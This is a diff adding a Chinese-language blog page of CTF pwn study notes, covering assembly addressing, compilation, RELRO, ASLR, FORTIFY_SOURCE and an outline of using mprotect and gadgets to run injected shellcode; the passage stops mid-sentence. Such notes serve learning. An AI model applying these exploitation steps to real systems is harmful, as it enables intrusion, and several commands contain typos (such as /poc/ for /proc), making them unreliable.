@@ -1,0 +1,622 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hot Time Exercising Records | 幻境</title><meta name="author" content="yub"><meta name="copyright" content="yub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Hot Time Exercising RecordsCollection系统调用号 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051section .data    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0sec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hot Time Exercising Records">
+<meta property="og:url" content="https://yubut.github.io/2022/11/08/Hot%20Time%20Exercising%20Records/index.html">
+<meta property="og:site_name" content="幻境">
+<meta property="og:description" content="Hot Time Exercising RecordsCollection系统调用号 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051section .data    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0sec">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yubut.github.io/imgs/tag_per_img.jpg">
+<meta property="article:published_time" content="2022-11-08T13:41:00.000Z">
+<meta property="article:modified_time" content="2024-11-09T03:26:55.449Z">
+<meta property="article:author" content="yub">
+<meta property="article:tag" content="Linux，知识碎片，pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yubut.github.io/imgs/tag_per_img.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yubut.github.io/2022/11/08/Hot%20Time%20Exercising%20Records/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hot Time Exercising Records',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-09 11:26:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/transpancy.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('/../imgs/tag_per_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="幻境"><span class="site-name">幻境</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Hot Time Exercising Records</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-08T13:41:00.000Z" title="发表于 2022-11-08 21:41:00">2022-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-09T03:26:55.449Z" title="更新于 2024-11-09 11:26:55">2024-11-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%A2%8E%E7%89%87/">碎片</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2022/11/08/Hot%20Time%20Exercising%20Records/" data-flag-title="Hot Time Exercising Records"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/11/08/Hot%20Time%20Exercising%20Records/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2022/11/08/Hot%20Time%20Exercising%20Records/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Hot-Time-Exercising-Records"><a href="#Hot-Time-Exercising-Records" class="headerlink" title="Hot Time Exercising Records"></a>Hot Time Exercising Records</h1><h4 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h4><p>系统调用号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, [msg]      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></table></figure>
+
+<p>ELF文件编译</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o<span class="regexp">//</span>生成flag.o文件</span><br><span class="line">ld -m elf_i386 -o flag flag.o<span class="regexp">//</span>使用ld命令将flag.o文件使用<span class="number">32</span>位x86架构链接为flag</span><br></pre></td></tr></table></figure>
+
+<p>注意：编译和执行汇编代码可能依赖于所使用的操作系统和体系结构，上述步骤适用于使用 NASM 汇编器和 ld 链接器的 32 位 x86 系统。根据环境相应地调整编译和链接的命令。</p>
+<p>.c文件编译</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc flag.<span class="keyword">c</span> -o flag</span><br></pre></td></tr></table></figure>
+
+<p>含key文件编译</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;the_key&quot;</span>&gt;key<span class="regexp">//</span>生成写入内容的key文件</span><br><span class="line">gcc flag.c -o flag</span><br></pre></td></tr></table></figure>
+
+<p>.s文件编译</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> flag.s -o flag</span><br></pre></td></tr></table></figure>
+
+<p>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言 是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处 理，将其转换为可执行文件或目标文件。</p>
+<p>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否 成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comma<span class="symbol">nd1</span> ; comma<span class="symbol">nd2</span> ; comma<span class="symbol">nd3</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执行 command3 。这样，多个命令可以按顺序在一行上执行。 或者也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命 令之间使用 &amp; 进行分隔,这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源。</p>
+<p><strong>真真假假，真亦真，假亦假</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个命令将字符串 ‘flag is here’ 追加写入 &#x2F;ctfshow_flag 文件中。 <strong>&gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。</strong>如果 &#x2F;ctfshow_flag 文件已经存在，那 么该命令会在文件的末尾添加 ‘flag is here’ 。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这个命令将字符串 ‘flag is here’ 覆盖写入 &#x2F;ctfshow_flag 文件中。 <strong>&gt; 符号表示以覆盖 的方式写入文件，如果文件不存在则创建新文件。</strong>如果 &#x2F;ctfshow_flag 文件已经存在，那么 该命令会将文件中原有的内容替换为 ‘flag is here’ 。 这两个命令都用于将 ‘flag is here’ 写入 &#x2F;ctfshow_flag 文件中，不同之处在于写入方式的不 同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新 内容。具体使用哪个命令取决于需求和文件操作的预期结果。</p>
+<p>使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。 具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可 以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境， 可以在该环境中执行命令并与用户进行交互。</p>
+<p><strong>RELRO介绍</strong></p>
+<p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要 通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage Table，简称 PLT）的可写性来防止针对这些结构的攻击。 </p>
+<p>RELRO保护有三种状态： </p>
+<ol>
+<li><p>No RELRO：在这种状态下，<strong>GOT和PLT都是可写</strong>的，意味着攻击者可以修改这些表中的指 针，从而进行攻击。这是最弱的保护状态。</p>
+</li>
+<li><p>Partial RELRO：在这种状态下，<strong>GOT的开头部分</strong>被设置为<strong>只读</strong>（RO），而<strong>剩余部分仍然可写</strong>。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p>
+</li>
+<li><p>Full RELRO：在这种状态下，<strong>GOT和PLT都被设置为只读</strong>（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p>
+</li>
+</ol>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile -S pwn<span class="regexp">//</span>查表项地址</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R pwn<span class="regexp">//</span>查看目标文件的动态链接命令</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -l pwn<span class="regexp">//</span>查看可执行文件或共享库的ELF头和程序头表信息</span><br></pre></td></tr></table></figure>
+
+<p><strong>保护卡</strong></p>
+<p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加 软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的 位置，从而增加了利用软件漏洞进行攻击的难度。 </p>
+<p>开启不同等级会有不同的效果： </p>
+<ol>
+<li><strong>内存布局随机化</strong>： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的 库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。 ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和 代码的位置。 </li>
+<li><strong>地址空间范围的随机化</strong>： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、 堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位 置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</li>
+<li><strong>随机偏移量</strong>： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着 每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发 现这些偏移量，才能准确地定位和利用漏洞。</li>
+<li><strong>堆和栈随机化</strong>： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起 始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置， 使得攻击者无法轻易地覆盖返回地址或控制程序流程。 ALSR全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space有三种情况： 0表示关闭ALSR 1表示部分开启（将mmap的基址、stack和vdso页面随机化） 2表示完全开启</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230706231549588.png" alt="image-20230706231549588"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>查看alsr</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>sudo su进入root模式后 <span class="regexp">//</span>ehco <span class="number">0</span> &gt; <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>关闭alsr</span><br></pre></td></tr></table></figure>
+
+
+
+<p>FORTIFY_SOURCE</p>
+<p>FORTIFY_SOURCE 是一个 C&#x2F;C++ 编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符 串和内存操作相关的安全漏洞。它是在编译时自动插入的一组额外代码，用于增强程序对于缓冲区溢出 和其他常见安全问题的防护。</p>
+<p> FORTIFY_SOURCE 提供了以下主要功能：</p>
+<ol>
+<li><strong>运行时长度检查</strong>：FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li>
+<li><strong>缓冲区溢出检测</strong>：FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy 、 memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。 </li>
+<li><strong>安全警告和错误报告</strong>：当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。 FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞。</li>
+</ol>
+<p>signal(11, (__sighandler_t)sigsegv_handler);函数当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p>
+<p><strong>mprotect函数</strong>（静态编译时可搜索【函数很多】）</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> --（<span class="keyword">filename</span>） checksec --（<span class="keyword">filename</span>）</span><br></pre></td></tr></table></figure>
+
+<p>作用：修改内存的权限为可读可写可执行</p>
+<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230713170259726.png" alt="image-20230713170259726"></p>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用： </p>
+<p>1）PROT_READ：表示内存段内的内容可读；<br> 2）PROT_WRITE：表示内存段内的内容可些；<br> 3）PROT_EXEC：表示内存段中的内容可执行；<br> 4）PROT_NONE：表示内存段中的内容根本没法访问。<br> 5） prot&#x3D;7 是可读可写可执行 指定的内存区间必须包含整个内存页（4K）。</p>
+<p>区间开始的地址start必须是一个内存页的起始地址， 并且区间长度len必须是页大小的整数倍。对于静态程序本身，地址是不会变的。 指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址， 并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。</p>
+<p><strong>起始地址判断方法</strong> ：①测试地址&amp;0xfff结果为0 ②%4096结果为0（一页为4k&#x3D;4096）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230726151609037.png" alt="image-20230726151609037"></p>
+<p>找到溢出点 程序无后门则自动生成shellcode（条件允许可ret2libc）利用mprotect函数+gadgets攻击（注意参数暂时小家【一次ret最好】）通过read函数将shellcode读入程序段 </p>
+<p>read函数原型: </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>fd 设为0时就可以从输入端读取内容 设为0<br>buf 设为我们想要执行的内存地址<br>设为我们已找到的内存地址size 适当大小就可以 只要够读入shellcode就可以，设置大点无所谓</p>
+<p><strong>.plt节</strong><br>plt(Procedure Linkage Table)，.plt节包含了从动态链接器调用调用从共享库中导入函数所必需的代码,该节中包含代码，节类型被标记为SHT_PROGBITS<br><strong>.got.plt</strong><br>也就是我们所说的got表，.got.plt节保留了全局偏移表。.got和.plt起提供了对导入共享库函数的访问入口,由动态链接器在运行时进行修改。如果攻击者获取到了堆或.bss漏洞的一个指针大小的写原语<br>就可以对该节进行任意修改.got.plt跟程序执行有关，该节类型被标记位SHT_PROGBITS<br><strong>.rel.</strong>*<br>.rel.”是一种通用的命名模式,用于表标与重定位(relocation)相关的节 (section)名称。在编译器和链接器中,重定位是将目标文件中的符号引用与符号定义关联起来的过程。<br>在可执行文件或共享库中，有许多不同的节（例如代码节、数据节、符号表节等).rel.节通常用于存储重定位表(relocation table) ,其中包含了需要进行重定位的符号引用和相应的重定位类型。<br>重定位表记录了加载和链接过程中需要修复的位置，以便正确解析符号引用,通过读取重定位表,系统或链接器可以根据符号的定义位置来计算并更新符号引I用的实队示地i1<br>.re1.*节的具体命名方式可能因不同的工具链和目标文件格式而有所不同,例如，在ELF格式的目标文件中，.rel.text表示与代码节(.text)相关的固定位表。<br>常见的.rel.节包括:<br>.rel.text :与代码节相关的重定位表.<br>.rel.data:与数据节相关的重定位表<br>·.rel.bss:与未初始化数据节(8SS)相关的重定位表<br>.rel.rodata ;与只读数据节相关的重定位表<br><strong>.strtab节</strong><br>字符串表，其包括.symtabl和.debug节区中的符号表以及节头部的节名称。表中的内容会被.symtab的EIN_Sym(Eilf32_ SymRElf64_Sym)结构中的st_name条目引用<br>objdump -R 是一个用于查看目标文件或可执行文件中重定位表 (relocation 